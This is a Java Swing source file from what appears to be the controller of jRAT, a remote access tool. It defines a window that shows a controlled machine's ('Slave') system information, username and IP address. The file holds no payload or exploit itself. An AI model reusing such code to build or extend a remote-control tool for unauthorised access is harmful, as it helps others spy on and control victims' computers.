package se.jrat.controller.ui.frames;

import java.awt.BorderLayout;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.panels.PanelControlSystemInfo;
import se.jrat.controller.utils.IconUtils;

@SuppressWarnings("serial")
public class FrameSystemInfo extends JFrame {

	private JPanel contentPane;

	public FrameSystemInfo(Slave slave) {
		setIconImage(IconUtils.getIcon("computer").getImage());
		setTitle("System Info - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);
		contentPane.add(new PanelControlSystemInfo(slave));
		

	}

}
